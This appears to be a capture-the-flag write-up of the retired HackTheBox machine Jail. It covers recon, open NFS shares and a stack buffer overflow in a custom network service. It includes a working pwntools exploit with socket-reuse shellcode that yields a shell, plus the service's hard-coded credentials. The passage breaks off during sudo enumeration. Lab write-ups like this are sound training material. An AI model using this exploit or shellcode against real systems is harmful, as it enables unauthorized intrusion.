---
title: HTB: Jail
url: https://0xdf.gitlab.io/2022/05/23/htb-jail.html
date: 2022-05-23T09:00:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, htb-jail, ctf, nmap, centos, nfs, feroxbuster, bof, source-code, gdb, peda, pwntools, shellcode, socket-reuse, nfs-nosquash, rvim, gtfobins, rar, quipquip, crypto, hashcat, hashcat-rules, atbash, rsa, rsactftool, facl, getfacl, htb-laboratory, htb-tartarsauce, oscp-plus-v1, oscp-plus-v2
---

![Jail](https://0xdfimages.gitlab.io/img/jail-cover.png)

Jail is an old HTB machine that is still really nice to play today. There’s a bunch of interesting fundamentals to work through. It starts with a buffer overflow in a jail application that can be exploited to get execution. It’s a very beginner BOF, with stack execution enabled, access to the source, and a way to leak the input buffer address. From there, I’ll abuse an NFS share without user squashing to escalate to the next user. Then there’s an rvim escape to get the next user. And finally a crypto challenge to get root. Jail sent me a bit down the rabbit hole on NFS, so some interesting exploration in Beyond Root, including an alternative way to make the jump from frank to adm.

## Box Info

| Name | [Jail](https://hackthebox.com/machines/jail)  [Jail](https://hackthebox.com/machines/jail) [Play on HackTheBox](https://hackthebox.com/machines/jail) |
| --- | --- |
| Release Date | 14 Jul 2017 |
| Retire Date | 06 Jan 2018 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Jail |
| Radar Graph | Radar chart for Jail |
| First Blood User | 03:34:57[RoliSoft RoliSoft](https://app.hackthebox.com/users/1178) |
| First Blood Root | 05:35:40[RoliSoft RoliSoft](https://app.hackthebox.com/users/1178) |
| Creator | [n0decaf n0decaf](https://app.hackthebox.com/users/250) |

## Recon

### nmap

`nmap` finds six open TCP ports, SSH (22), HTTP (80), RPC (111), NFS (2049), mountd (20048), and an unknown service on 7411:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.34
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-16 19:28 UTC
Nmap scan report for 10.10.10.34
Host is up (0.096s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7411/tcp  open  daqstream
20048/tcp open  mountd

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
oxdf@hacky$ nmap -p 22,80,111,2049,7411,20048 -sCV -oA scans/nmap-tcpscripts 10.10.10.34
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-16 20:03 UTC
Nmap scan report for 10.10.10.34
Host is up (0.091s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      40186/tcp6  nlockmgr
|   100021  1,3,4      41707/udp   nlockmgr
|   100021  1,3,4      43745/tcp   nlockmgr
|   100021  1,3,4      44810/udp6  nlockmgr
|   100024  1          36461/udp6  status
|   100024  1          52309/tcp6  status
|   100024  1          53183/udp   status
|   100024  1          60283/tcp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7411-TCP:V=7.80%I=7%D=5/16%Time=6282AE29%P=x86_64-pc-linux-gnu%r(NU
...[snip]...
SF:ER\x20command\.\n")%r(giop,1D,"OK\x20Ready\.\x20Send\x20USER\x20command
SF:\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.82 seconds

```

Based on the [Apache](https://access.redhat.com/solutions/445713) version, the host is likely running Centos 7.4.

The RPC and mountd are both in support of NFS (RPC [is required](https://serverfault.com/a/1016083) for NFSv2 and v3).

### Website - TCP 80

#### Site

The site is just some ASCII art of a jail cell:

![image-20220516163837914](https://0xdfimages.gitlab.io/img/image-20220516163837914.png)

#### Tech Stack

The response headers don’t reveal much beyond what `nmap` showed. The same page does load as `index.html`, so no indication about any dynamic web content.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.34

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                    
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.34
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 1m     29999/29999   0s      found:0       errors:70
[####################] - 1m     29999/29999   307/s   http://10.10.10.34

```

It finds nothing. I’ll eventually come back to this and try `directory-list-2.3-medium.txt`, which was the standard list years ago, and it does find something:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.34 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.34
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       42l      173w     2106c http://10.10.10.34/
301      GET        7l       20w      236c http://10.10.10.34/jailuser => http://10.10.10.34/jailuser/
[####################] - 10m   661638/661638  0s      found:2       errors:258    
[####################] - 10m   220546/220546  338/s   http://10.10.10.34 
[####################] - 10m   220546/220546  337/s   http://10.10.10.34/ 
[####################] - 0s    220546/220546  0/s     http://10.10.10.34/jailuser => Directory listing (add -e to scan)

```

I’ll want to check out `/jailuser`.

#### /jailuser

As `feroxbuster` pointed out, directory listing is enabled on this directory, and it shows a `dev` directory. In there are three files:

![image-20220516165114316](https://0xdfimages.gitlab.io/img/image-20220516165114316.png)

I’ll download all three.

### NFS - TCP 2049

#### Shares

`showmount -e` will list the NFS shares on a host:

```

oxdf@hacky$ showmount -e 10.10.10.34
Export list for 10.10.10.34:
/opt          *
/var/nfsshare *

```

The `*` are the ACLs as far as what can mount the share. It could have whitelisted IPs/domains, but in this case, anyone can mount them.

#### /opt

I’ll mount `/opt`:

```

oxdf@hacky$ sudo mount -t nfs 10.10.10.34:/opt /mnt/opt/

```

These mounts will take the permissions from the remote system. So `/mnt/opt` is owned by root, but readable by everyone:

```

oxdf@hacky$ ls -ld /mnt/opt/
drwxr-xr-x 4 root root 33 Jun 26  2017 /mnt/opt/

```

It only has one file:

```

oxdf@hacky$ find /mnt/opt/ -type f -ls
   106366      4 -rwxr-x---   1 root     root           52 Jun 26  2017 /mnt/opt/logreader/logreader.sh

```

It’s owned by root, and it is a one line Bash script that reads a file named `checkproc.log`:

```

#!/bin/bash
/bin/cat /home/frank/logs/checkproc.log

```

I’m actually pretty surprised that I can read this, as it shows that only the root user and root group can read it. I’ll dig into the details in [Beyond Root](#reading-logreadersh).

#### nfsshare

I’ll make a directory to mount `nfsshare` on as well, and mount it:

```

oxdf@hacky$ sudo mount -t nfs 10.10.10.34:/var/nfsshare /mnt/nfsshare

```

This share is owned by root, but shows the group oxdf:

```

oxdf@hacky$ ls -ld /mnt/nfsshare/
drwx-wx--x 2 root oxdf 18 May 16 21:29 /mnt/nfsshare/

```

It’s not actually that there’s an oxdf group on Jail, but rather it’s the group with id 1000 on the remote host. When my system sees group id 1000, it looks up it’s name for that group, which is oxdf, and uses that.

As a member of group 1000, I can’t read in this directory, but I can write:

```

oxdf@hacky$ touch /mnt/nfsshare/test0xdf

```

It returns without error, and I seem to have full control over the created object (I’ll abuse this later for an alternative privesc step in [Beyond Root](#alternative-nfs-abuse---priv-to-adm)):

```

oxdf@hacky$ ls -l /mnt/nfsshare/test0xdf
-rw-rw-r-- 1 oxdf oxdf 0 May 16 21:33 /mnt/nfsshare/test0xdf
oxdf@hacky$ file /mnt/nfsshare/test0xdf
/mnt/nfsshare/test0xdf: empty

```

Not much I can do here now. I’ll have to come back to these later.

### TCP 7411

I’ll `nc` to this service, and it prints back “OK Ready. Send USER command.”. I’ll spend some time trying different commands, and eventually find `USER [string]` gets a response:

```

OK Ready. Send USER command.
USER 0xdf
OK Send PASS command.

```

Trying the same thing, it rejects my auth:

```

OK Ready. Send USER command.
USER 0xdf
OK Send PASS command.
PASS 0xdf
ERR Authentication failed.

```

I’ll have to come back to this.

## Shell as nobody

### Reverse Engineering

#### Files

I’ve got the three files from `/jailuser`. `compile.sh` compiles the source and installs it in place, restarting the service:

```

gcc -o jail jail.c -m32 -z execstack
service jail stop
cp jail /usr/local/bin/jail
service jail start

```

It is using `execstack`, which means that data execution prevention (DEP) is disabled, and if I can overflow a buffer, I can write shellcode directly to the stack.

`jail` is a 32-bit ELF executable, presumably the one generated by `jail.c` and `compile.sh`:

```

oxdf@hacky$ file jail
jail: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1288d425d0da3a9ecc078ce86c509365e832eb49, not stripped

```

`jail.c` is C code.

#### main

In `jail.c` the `main` function creates and configures a socket (not shown), and then enters a loop listening on 7411, accepting connections and forking them off into the `handle` function:

```

    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }

```

Nothing too exciting here.

#### handle

`handle` starts with some initialization:

```

int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);

```

It uses 256-byte buffers for the `username` and `password` variables. There’s also a variable `debugmode` that’s initialized to 0. The STDIN and STDOUT file descriptors are moved to the socket.

Then there’s a pair of nested `while` loops that read and parse user input:

```

    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
...[snip]...
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }

```

It’s reading up to 1024 bytes from the socket, and then breaking it into lines by splitting on newline and null. Then it loops over the lines, processing each line (in the `...[snip]...` above).

After this loop, there’s a call to `auth`:

```

    if (auth(username, password)) {
...[snip]...
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}

```

If `auth` succeeds, then it does some stuff, otherwise it prints and returns.

#### Initial Input Loop

The initial loop above is checking for lines that start with “USER “, “PASS “, or “DEBUG”:

```

            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }

```

If it starts with “USER” or “PASS”, it copies that into the appropriate variable and sets `gotuser` or `gotpass` to 1. If It’s “DEBUG”, it toggles the `debugmode` variable.

Once `gotuser` and `gotpass` are both one, it breaks this loop.

#### auth

This function simply checks the input username and password against the hard-coded creds “admin” / “1974jailbreak!”:

```

int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}

```

#### Successful Auth

On successful auth, the program doesn’t do much. It reads up to 1024 bytes, and then compares the start for the commands “OPEN” and “CLOSE”:

```

        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }

```

#### Overview

There’s nothing particularly interesting about the program itself. It simply takes auth and then prints a message depending on the command.

I do now know the username and password, so I can complete the actions:

```

oxdf@hacky$ nc 10.10.10.34 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
OK Authentication success. Send command.
OPEN
OK Jail doors opened.CLOSE
oxdf@hacky$ nc 10.10.10.34 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
OK Authentication success. Send command.
CLOSE
OK Jail doors closed.

```

There’s also DEBUG mode that leaks the address of the `userpass` buffer:

```

oxdf@hacky$ nc 10.10.10.34 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
Debug: userpass buffer @ 0xffffd610
OK Authentication success. Send command.
CLOSE
OK Jail doors closed.

```

But most importantly, there’s a buffer overflow. My input for the user / password / debug loop if read into a 1024 byte buffer. If the first bytes match “USER “ or “PASS “, the reset up to 256 bytes are copied into a 256-byte buffer, which is what’s passed into `auth`. In `auth`, `password` is unsafely copied into `userpass`, a 16-byte buffer (which I know the address of due to the DEBUG mode).

### Exploit

#### Buffer Location

Unfortunately, the leak of the address happens after I’m done sending overflowable input to the program. Still, I can check and see if it is changing, and it turns out, that address is static:

```

oxdf@hacky$ for i in $(seq 1 10); do 
> echo -e 'DEBUG\nUSER admin\nPASS 1974jailbreak!\n' |
> nc -w 1 10.10.10.34 7411 |
> grep Debug;
> done
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610

```

This loop just sends the input into the program to get to where it prints the debug. I’m using `-w 1` with `nc` to close the connection after one second.

This combined with the compile script that shows the `execstack` [flag](https://linux.die.net/man/8/execstack) means that I can overwrite the buffer with shellcode and then jump right to it. This style of buffer overflow is not too common any more, but very beginner friendly (at least as far as bof goes).

#### Set Up GDB

I’m going to start a local copy of `jail` and attach the `gdb` debugger to it. I’ve installed and have configured `gdb` to run with [Peda](https://github.com/longld/peda). I’ll start `jail` in one window, and then attach `gdb` to it (I’ll need to run as root or mess with `prtrace_scope`). `pidof` is a nice trick to get the pid without having to `grep` running processes each time (though if you get multiple `jail` processes running, it will mess things up):

```

oxdf@hacky$ sudo gdb -q -p $(pidof jail)
Attaching to process 28225
Reading symbols from /media/sf_CTFs/hackthebox/jail-10.10.10.34/jail...
(No debugging symbols found in /media/sf_CTFs/hackthebox/jail-10.10.10.34/jail)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
...[snip]...
gdb-peda$

```

There’s a bit of configuration I need to make sure is set up correctly. First, when there’s a new connection, it will fork a child process, and that child will be where the overflow is. To make sure I run in that fork, I’ll run:

```

gdb-peda$ set follow-fork-mode child

```

I also want to make sure the parent doesn’t detach when that follow happens. I’ll run:

```

gdb-peda$ set detach-on-fork off 

```

Now once I debug into a fork, and I’m ready to go back to the parent and wait for the next connection, I’ll run `info inferiors`, and then `inferiors X`, where X is the one I want to bring back to the front (typically 1).

```

gdb-peda$ info inferiors 
  Num  Description       Executable        
  1    process 28225     /media/sf_CTFs/hackthebox/jail-10.10.10.34/jail 
* 2    <null>            /media/sf_CTFs/hackthebox/jail-10.10.10.34/jail 
gdb-peda$ inferior 1
[Switching to inferior 1 [process 28225] (/media/sf_CTFs/hackthebox/jail-10.10.10.34/jail)]
[Switching to thread 1.1 (process 28225)]
#0  0xf7fbf549 in __kernel_vsyscall ()

```

Now I can run this (`c` for continue) and crash it. I’ll connect in a third window with `nc`, and send a longer string of As as the password:

```

oxdf@hacky$ nc 127.0.0.1 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

This just hangs, but at `gdb`:

```

Thread 4.1 "jail" received signal SIGSEGV, Segmentation fault.
[Switching to process 28743]
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x83a51c4 --> 0x0 
EDX: 0x83a51c3 --> 0xa ('\n')
ESI: 0xf7f9d000 --> 0x1e7d6c 
EDI: 0xf7f9d000 --> 0x1e7d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffdbf1f0 ('A' <repeats 18 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffdbf1f0 ('A' <repeats 18 times>)
0004| 0xffdbf1f4 ('A' <repeats 14 times>)
0008| 0xffdbf1f8 ("AAAAAAAAAA")
0012| 0xffdbf1fc ("AAAAAA")
0016| 0xffdbf200 --> 0x4141 ('AA')
0020| 0xffdbf204 --> 0xf7fed000 --> 0x2bf24 
0024| 0xffdbf208 --> 0xffdbf738 --> 0xf7fd49fd (<_dl_allocate_tls_init+13>:     add    ebx,0x18603)
0028| 0xffdbf20c --> 0x4141090e 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()

```

There’s a `SIGSEGV`, and EIP is 0x41414141, overwritten by my As.

#### Find Return Offset

I want to located how far into the password the four bytes that end up in EIP are. I’ll use `pattern_create` in `gdb` (part of Peda) to generate a buffer, and then I’ll switch back to the main process and continue:

```

gdb-peda$ pattern_create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ inferior 1
[Switching to inferior 1 [process 28225] (/media/sf_CTFs/hackthebox/jail-10.10.10.34/jail)]
[Switching to thread 1.1 (process 28225)]
#0  0xf7fbf549 in __kernel_vsyscall ()
gdb-peda$ c
Continuing.

```

I’ll connect again with `nc`, and this time send the buffer as the password:

```

oxdf@hacky$ nc 127.0.0.1 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa

```

At `gdb`, there’s a crash:

```

[New inferior 5 (process 28978)]

Thread 5.1 "jail" received signal SIGSEGV, Segmentation fault.
[Switching to process 28978]
[----------------------------------registers-----------------------------------]
...[snip]...
ESP: 0xffdbf1f0 ("A)AAEAAa")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffdbf1f0 ("A)AAEAAa")
0004| 0xffdbf1f4 ("EAAa")
0008| 0xffdbf1f8 --> 0x100 
...[snip]...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()

```

It’s at the address 0x413b4141. `pattern_offset` shows that’s 28 bytes into the buffer:

```

gdb-peda$ pattern_offset 0x413b4141
1094402369 found at offset: 28

```

I can prove this by generating a string of 28 A followed by four B, and sending it:

```

oxdf@hacky$ python -c 'print("A"*28 + "BBBB")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
oxdf@hacky$ nc 127.0.0.1 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

```

It crashes at 0x42424242 (“BBBB”):

```

Stopped reason: SIGSEGV
0x42424242 in ?? ()

```

#### First Stage

I could just hardcode in the `userpass` address, but since it will likely change each time the program is started, I’ll have the program connect and get it before it starts exploiting:

```

#!/usr/bin/env python3

from pwn import *

if args['REMOTE']:
    ip = '10.10.10.34'
else:
    ip = '127.0.0.1'

# Get Leaked Address
p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"DEBUG")
p.recvuntil(b"OK DEBUG mode on.")
p.sendline(b"PASS admin")
p.recvuntil(b"Debug: userpass buffer @ ")
userpass_addr = int(p.recvline(), 16)
log.info(f"Got leak of userpass from server: 0x{userpass_addr:08x}")
p.close()

```

This works nicely!

```

oxdf@hacky$ python shell.py 
[+] Opening connection to 127.0.0.1 on port 7411: Done
[*] Got leak of userpass from server: 0xffdbf1d0
[*] Closed connection to 127.0.0.1 port 7411

```

It works on the remote instance as well (returning the same value I found manually earlier):

```

oxdf@hacky$ python shell.py REMOTE
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Got leak of userpass from server: 0xffffd610
[*] Closed connection to 10.10.10.34 port 7411

```

#### Second Stage

Next I’ll add code that connects again and does the same thing, but this time jumping to my input where I can put shellcode.

```

# Get Shell
payload =  b"A"*28
payload += p32(userpass_addr + 32)
payload += b"\xCC"*16

p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS " + payload)

```

The payload is 28 As to do the overflow, putting the address of `userpass` plus 32 into the return address (28 As plus the four bytes of address). For now, I’ll have the rest of the payload be some `\xCC` bytes, which cause interrupts when they are executed. My goal at this point is just to get this code running and break, knowing I can weaponize this with shellcode once I verify it works. If I put something else in there (like As or Cs), those are actual commands that might run and I’ll have to figure out where I am when it crashes.

I’ll run this (knowing I need to `inferiors 1` and `c` between connections) and it works, resulting in a hit of the ints:

```

Thread 30.1 "jail" received signal SIGTRAP, Trace/breakpoint trap.
[Switching to process 31918]
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x83a51c4 --> 0x0 
EDX: 0x83a51c3 --> 0xa ('\n')
ESI: 0xf7f9d000 --> 0x1e7d6c 
EDI: 0xf7f9d000 --> 0x1e7d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffdbf1f0 --> 0xcccccccc 
EIP: 0xffdbf1f1 --> 0xcccccccc
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffdbf1f1:  int3   
   0xffdbf1f2:  int3   
   0xffdbf1f3:  int3   
   0xffdbf1f4:  int3
[------------------------------------stack-------------------------------------]
0000| 0xffdbf1f0 --> 0xcccccccc 
0004| 0xffdbf1f4 --> 0xcccccccc 
0008| 0xffdbf1f8 --> 0xcccccccc 
0012| 0xffdbf1fc --> 0xcccccccc 
0016| 0xffdbf200 --> 0x0 
0020| 0xffdbf204 --> 0xf7fed000 --> 0x2bf24 
0024| 0xffdbf208 --> 0xffdbf738 --> 0xf7fd49fd (<_dl_allocate_tls_init+13>:     add    ebx,0x18603)
0028| 0xffdbf20c --> 0x4141090e 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGTRAP
0xffdbf1f1 in ?? ()

```

If I look back 33 bytes before EIP, it shows the submitted password:

```

gdb-peda$ x/16xw $eip-33
0xffdbf1d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffdbf1e0:     0x41414141      0x41414141      0x41414141      0xffdbf1f0
0xffdbf1f0:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xffdbf200:     0x00000000      0xf7fed000      0xffdbf738      0x4141090e

```

EIP holds 0xffdbf1f1, pointing to the second `\xCC` (EIP has already moved forward one when it stops at the first interrupt).

#### Shellcode

I’ll look for some shellcode to add to the exploit. I like shellcode that use `dup2` to copy the stdin, stdout, and stderr descriptors over to the socket, and then `execve` something like `sh` so that the process becomes a shell and is reading and writing to the socket. [This one](https://www.exploit-db.com/exploits/34060) from exploitDB looks fine. I’ll add that to the script:

```

# Get Shell
# socket reuse shellcode from: https://www.exploit-db.com/exploits/34060
shellcode =  b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80";

payload =  b"A"*28
payload += p32(userpass_addr + 32)
payload += shellcode

p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS " + payload)

p.interactive()

```

It works:

```

oxdf@hacky$ python shell.py REMOTE
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Got leak of userpass from server: 0xffffd610
[*] Closed connection to 10.10.10.34 port 7411
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Switching to interactive mode

$ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0

```

I can still get a PTY, but I won’t want to do the `stty raw -echo` trick in this shell:

```

$ script /dev/null -c bash
bash-4.2$ $

```

## Shell as frank

### Enumeration

#### SELinux

I’ll note that when I run `id`, it prints not only the `uid`, `gid`, and `groups`, but also a `context`. A [security context](http://selinuxproject.org/page/SELinux_contexts) is an SELinux thing. SELinux is a security feature to harden Linux systems and prevent certain behaviors at a more granular level.

#### Home Directories

There’s one home directory on this box, and nobody can’t access it:

```

bash-4.2$ $ ls -l
total 4
drwx------. 17 frank frank 4096 Jun 28  2017 frank

```

Seems like a good guess that `user.txt` is in there.

#### sudo

nobody can run `/opt/logreader/logreader.sh` as frank with no password:

```

bash-4.2$ $ sudo -l
Matching Defaults entries for nobody on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
